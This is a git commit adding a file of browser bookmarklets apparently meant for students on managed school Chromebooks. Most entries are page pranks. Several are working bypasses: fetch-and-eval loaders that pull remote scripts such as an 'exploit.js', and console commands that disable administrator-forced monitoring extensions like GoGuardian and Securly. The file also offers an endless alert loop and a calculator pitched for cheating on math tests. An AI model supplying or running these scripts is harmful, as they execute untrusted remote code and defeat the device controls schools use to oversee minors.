2c66d9f0b3dd7093dbb322fa45636abdb9ca7022
SchoolHacker3 <122331032+SchoolHacker3@users.noreply.github.com>
2023-01-09 18:20:19 -0800

    Update and rename README.md to Hacks.js

---
+++ Hacks.js
@@ -0,0 +1,178 @@
+EXTENSION DISABLER 2.0 Ver106-
+EXTENSION DISABLER 2.0 (RUN IN CONSOLE) (WORKS EVEN IF BLOCKED!)  (WORKS ON FORCE ADMIN EXTENSIONS!:
+
+javascript:fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+
+FORCE CONSOLE 1 (⚠️DOESN'T WORK ON SOME WEBSITES⚠️)
+FORCE CONSOLE (RUNS SCRIPTS EVEN IF CONSOLE BLOCKED!):
+
+javascript:(function () {     var script =  document.createElement('script');    script.src="//cdn.jsdelivr.net/npm/eruda";     document.body.appendChild(script);    script.onload = function () {         eruda.init()     } })();
+
+
+
+FORCE CONSOLE 2 (⚠️DOESN'T WORK ON SOME WEBSITES⚠️)  (also only bookmark)
+
+FORCE CONSOLE (RUNS SCRIPTS EVEN IF CONSOLE BLOCKED!): 
+
+javascript:(function()%7B(function() %7Bvar x %3D document.createElement("script")%3Bx.src %3D "https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2FSnowLord7%2Fdevconsole%40master%2Fmain.js"%3Bx.onload %3D alert("Loaded Developer Console, ALSO CREDIT TO Lxix_ and Jcbphysics!")%3Bdocument.head.appendChild(x)%3B%7D)()%7D)()
+
+FORCE EDIT WEBPADGE
+FORCE EDIT (EDIT WEBPADGE LIKE INSPECT ELEMENT EVEN IF BLOCKED!): javascript:document.body.contentEditable = 'TRUE OR FALSE HERE'; document.designMode='on'; void 0
+
+CUSTOM CURSOR (ONLY IN BOOKMARK)
+CUSTOM CURSOR (44x44 IMAGE) (TO RESIZE YOUR IMAGE GO TO THIS SITE:https://www.resizepixel.com): javascript:(function()%7B var style %3D document.createElement(%27style%27), styleContent %3D document.createTextNode(%27* %7B cursor: url(YOUR IMAGE LINK HERE!) 22 22, auto !important%7D%27)%3B style.appendChild(styleContent )%3B var caput %3D document.getElementsByTagName(%27head%27)%3B caput%5B0%5D.appendChild(style)%3B %7D)()%3B
+
+Harlem SHAKE
+Harlem Shake (Litteraly Shakes The website your on): CLICK HERE
+
+
+
+Troll (WARNING FLASHING LIGHTS)
+Troll (LAGS): GO TO THE CODE HERE (CODE CANT RUN IN THIS DOC!): CLICK HERE
+
+Glitch (WARNING FLASHING LIGHTS)
+Glitch (Glitches website, good for annoying aids looking at your computer): javascript:(function(){function c(){return'#'+Math.floor(16777215*Math.random()).toString(16)}function r(e){return Math.floor(Math.random()*e)+1}function l(e){e.requestFullscreen?e.requestFullscreen():e.mozRequestFullScreen?e.mozRequestFullScreen():e.webkitRequestFullscreen?e.webkitRequestFullscreen():e.msRequestFullscreen&&e.msRequestFullscreen()}var d=document;d.head.innerHTML='<style>*{margin:0; overflow:hidden; padding:0;overflow:hidden;} div{  transform-origin: 50% 50%; width:100%; height:1px; position:relative; z-index:1;} </style>',d.body.innerHTML='';var w=window.screen.availHeight;for(d.body.addEventListener('click',function(){l(d.documentElement)}),i=0;w>=i;i++){var z=d.createElement('div');z.id='b'+i,z.style.backgroundColor=c(),d.body.appendChild(z)}setInterval(function(){for(var e=0;10>e;e++)d.getElementById('b'+r(w)).style.backgroundColor=c(),d.getElementById('b'+r(w)).style.height=r(4)+'px',d.body.style.backgroundColor=c(),d.body.style.transform=r(256)>128?'scale(3) rotate('+r(35)+'deg)':'rotate(0deg) scale(1)';window.scrollTo(0,document.body.scrollHeight)},10),setInterval(function(){window.scrollTo(0,0)},50);})()
+
+
+
+
+
+Annoy (VERY ANNOYING)
+Annoy (Runs alert(messages) that go forever: (____________________________________________
+
+javascript: (function() {  function annoy() {    alert('Sorry! You cant close this :) ');    annoy();  }  annoy();})();
+
+EXTENSION DISABLER Ver106
+EXTENSION DISABLER Ver106+ (CHECK VERSION HERE COPY LINK: chrome://version)
+
+Open this URL below on your chromebook (if this link is blocked then your not on a school schoolchromebook or you are under Ver106): chrome-extension://gndmhdcefbhlchkhipcnnbkcmicncehk/manifest.json 
+
+Then open a copy of this tab and then replace it with the extension you want to disable’s ID here: chrome://extensions then enable dev mode and then copy the id that is  under the name (EX:Securly, Hapara, GoGuardian) and then go to one of the manifest urls and then replace the urls ID with the extension id, then go back to the original and then Open inspect and navigate to the console tab (if your inspect was blocked go to the force inspect element script).
+
+Run this code in the console in the url : chrome.management.setEnabled('ENTER EXTENSION ID HERE', false)
+
+EXTENSION DISABLER Ver107+ 
+EXTENSION DISABLER Ver107+  ⚠️WARNING, IF YOU CLOSE THE TAB THE SCRIPT IS RUNNING ON THE EXTENSION WILL COME BACK!⚠️) INSTRUCT: OPEN A EXTENSION THAT IS NOT INSTALLED BY ADMIN ON WEBSTORE THEN SPAM ESCAPE UNTILL THERE IS about:blank PADGE POPS UP THEN RUN THE SCRIPT HERE
+
+CODE: javascript: let shim = false;var ids = prompt("extension ids (comma separated) also sub to Lxix_ and Jcbphysics").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 250);
+
+FORCE TYPE (WORKS BEST ON GOOGLE SEARCH)
+FORCE TYPE (FORCES YOU TO TYPE WHAT YOU WANT):
+
+javascript:(function(){(function(){var TEXT = 'TYPE YOUR MESSAGE HERE ';Array.prototype.slice.call(document.querySelectorAll('input[type=text],textarea')).map(function(el){el.onkeypress=function(evt){var charCode = typeof evt.which == 'number' ? evt.which : evt.keyCode;if (charCode && charCode > 31) {var start = this.selectionStart, end = this.selectionEnd;this.value = this.value.slice(0, start) + TEXT[start % TEXT.length] + this.value.slice(end);this.selectionStart = this.selectionEnd = start + 1;}return false;}});}());}())
+
+
+
+CAUCULATOR (CHEAT ON MATH TEST)
+CAUCULATOR (CHEAT IN MATH TEST ON COMPUTER):
+
+javascript:expr=prompt('Formula...(eg:  #*#  or # / # or # + # or # - #)','');if(expr!=null){with(Math){evl=parseFloat(eval(expr))};if(isNaN(evl)){alert('Really are you kidding me? Enter in a number, not that stuff!')}else{alert(evl)}}else{void(null)}
+
+
+
+
+
+MLG FROG TAKEOVER (ONLY IN INSPECT CONSOLE)
+MLG FROG TAKE OVER (TAKE OVER THE WEBSITE)
+
+var best = 'url(http://i0.kym-cdn.com/photos/images/original/000/777/908/28a.gif) 0px 0px';function a(){rec(document.body);}function rec(n){doit(n); var nodes = n.childNodes; var x = nodes.length; while(x--){rec(nodes[x]);}}function doit(n){if(n.style) n.style.background = best;}a();
+
+
+ORBIT IMAGES
+ORBIT IMAGES (TAKE OVER THE WEBSITE): javascript:R=0; x1=.1; y1=.05; x2=.25; y2=.24; x3=1.6; y3=.24; x4=300; y4=200; x5=300; y5=200; DI=document.images; DIL=DI.length; function A(){for(i=0; i-DIL; i++){DIS=DI[ i ].style; DIS.position='absolute'; DIS.left=(Math.sin(R*x1+i*x2+x3)*x4+x5)+"px"; DIS.top=(Math.cos(R*y1+i*y2+y3)*y4+y5)+"px"}R++}setInterval('A()',5); void(0);
+
+
+
+
+
+
+
+
+
+BOUNCING IMAGES (WORKS ON IMG SITES)
+BOUNCING IMAGES (TAKE OVER THE WEBSITE): javascript:R=0; x1=.1; y1=.05; x2=.25; y2=.24; x3=1.6; y3=.24; x4=300; y4=200; x5=300; y5=200; DI=document.getElementsByTagName("img"); DIL=DI.length; function A(){for(i=0; i-DIL; i++){DIS=DI[ i ].style; DIS.position='absolute'; DIS.left=(Math.sin(R*1+i*x2+x3)*x1+x2)+"px"; DIS.top=(Math.cos(R*y1+i*y2+y3)*y4+y5)+"px"}R++}setInterval('A()',50); void(0);
+
+
+
+
+
+
+
+
+
+GOOGLE SNAKE PLUS (ONLY WORKS ON GOOGLE SNAKE)
+GOOGLE SNAKE PLUS (GOOGLE SNAKE): javascript: req = new XMLHttpRequest(); req.open('GET', 'https://raw.githubusercontent.com/DarkSnakeGang/GoogleSnakeCustomMenuStuff/main/custom.js'); req.onload = function() { eval(this.responseText + 'snake.more_menu();'); }; req.send();
+
+
+
+
+
+
+
+
+
+WEBPADGE BLACK HOLE
+WEB BLACK HOLE (TAKE OVER THE WEBSITE): javascript: (function(){var x = document.getElementsByTagName("*"); for (i = 0; i < x.length; i++) {x[i].style.position = "absolute"; x[i].style.top = "50%"; x[i].style.left = "50%"; x[i].style.transition = "5s"; x[i].style.transform = "translate(-50%, -50%)"}}());
+
+
+
+TINY WEBSITE
+TINY WEBSITE (INFINITESIMAL WEBPADGE): javascript:(function(){document.documentElement.style.transitionDuration="10s";document.documentElement.style.transformOrigin = "center, top";document.documentElement.style.transitionTimingFunction="ease-in";document.documentElement.style.transform="scale(0.1)";}());
+
+
+
+
+
+
+
+ULTRA SPIN (1 MINUTE SPIN)
+ULTRA SPINS THE WEBSITE (ROTATIVE WEBPADGE): javascript: (function(){document.documentElement.style.transitionDuration="60s";document.documentElement.style.transitionTimingFunction="ease-in";document.documentElement.style.transform="rotate(360000deg)";}());
+
+
+
+
+
+BULLDOZE THE SITE
+BULLDOZES THE SITE (ACCELERATABLE WEBPADGE): javascript: (function(){document.body.style.transition="10s";document.body.style.borderLeft="2000px solid red";document.body.style.overflowX="hidden";}());
+
+
+
+
+
+INVISI MOUSE
+INVISIBLE MOUSE: javascript: (function(){var x = document.getElementsByTagName("*"); for (i = 0; i < x.length; i++) {x[i].style.cursor = "none"};}());
+
+
+
+
+INFINITE LOADING WEBSITE
+INFINITE LOADING WEBSITE: javascript: (function(){var x = document.body.getElementsByTagName("*"); for (i = 0; i < x.length; i++){x[i].style.cursor = "wait"; x[i].removeAttribute("href");}}());
+
+
+
+
+
+
+
+CHROME DINO AI
+WIN CHROME DINO: javascript: function keyDown(e){Podium={};var n=document.createEvent("KeyboardEvent");Object.defineProperty(n,"keyCode",{get:function(){return this.keyCodeVal}}),n.initKeyboardEvent?n.initKeyboardEvent("keydown",!0,!0,document.defaultView,e,e,"","",!1,""):n.initKeyEvent("keydown",!0,!0,document.defaultView,!1,!1,!1,!1,e,0),n.keyCodeVal=e,document.body.dispatchEvent(n)}function keyUp(e){Podium={};var n=document.createEvent("KeyboardEvent");Object.defineProperty(n,"keyCode",{get:function(){return this.keyCodeVal}}),n.initKeyboardEvent?n.initKeyboardEvent("keyup",!0,!0,document.defaultView,e,e,"","",!1,""):n.initKeyEvent("keyup",!0,!0,document.defaultView,!1,!1,!1,!1,e,0),n.keyCodeVal=e,document.body.dispatchEvent(n)}setInterval(function(){Runner.instance_.horizon.obstacles.length>0&&(Runner.instance_.horizon.obstacles[0].xPos<25*Runner.instance_.currentSpeed-Runner.instance_.horizon.obstacles[0].width/2&&Runner.instance_.horizon.obstacles[0].yPos>75&&(keyUp(40),keyDown(38)),Runner.instance_.horizon.obstacles[0].xPos<30*Runner.instance_.currentSpeed-Runner.instance_.horizon.obstacles[0].width/2&&Runner.instance_.horizon.obstacles[0].yPos<=75&&keyDown(40))},5);
+
+
+
+
+
+GOOGLE SNAKE MOUSE MODE
+GOOGLE SNAKE MOUSE MODE (GO TO SETTINGS ON THE GAME AND THEN CLICK AIM TRAINER, JOIN A GAME AND THEN UNALIVE IN THE GAME AND THEN GO BACK TO SETTINGS AND TURN OFF AIM TRAINER, THEN JOIN A NEW GAME AND YOU HAVE MOUSE MODE) RAW SCRIPT COPY:  https://tinyurl.com/RawCopy2
+
+
+
+
+
+INSPECT SNAKE GAME (ONLY IN CONSOLE)
+INSPECT SNAKE  (⚠️WARNING⚠️: INSPECT CONSOLE HAS TO BE UNBLOCKED!) (⚠️CLICK ON THE WEBSITE BEFORE STARTING GAME⚠️) : https://tinyurl.com/InspectSnake
+
+
+
+HISTORY FLOODER
+
+HISTORY FLOODER: javascript:(function()%7Bvar%20num%3Dprompt(%22How%20Times%20Do%20You%20Want%20This%20Page%20To%20Show%20Up%20In%20your%20History%3F%22)%3Bdone%3Dfalse%3Bx%3Dwindow.location.href%3Bfor%20(var%20i%3D1%3B%20i%3C%3Dnum%3B%20i%2B%2B)%7Bhistory.pushState(0%2C%200%2C%20i%3D%3Dnum%3Fx%3Ai.toString())%3Bif(i%3D%3Dnum)%7Bdone%3Dtrue%7D%7Dif(done%3D%3D%3Dtrue)%7Balert(%22History%20Flooding%20Successful!%5Cn%20%22%2Bwindow.location.href%2B%22%20%5CnNow%20Appears%20In%20Your%20History%20%22%2Bnum%2B(num%3D%3D1%3F%22%20time.%22%3A%22%20Times.%20%5CnMade%20By%3A%20Jcbphysics%22))%7D%7D)()%3B
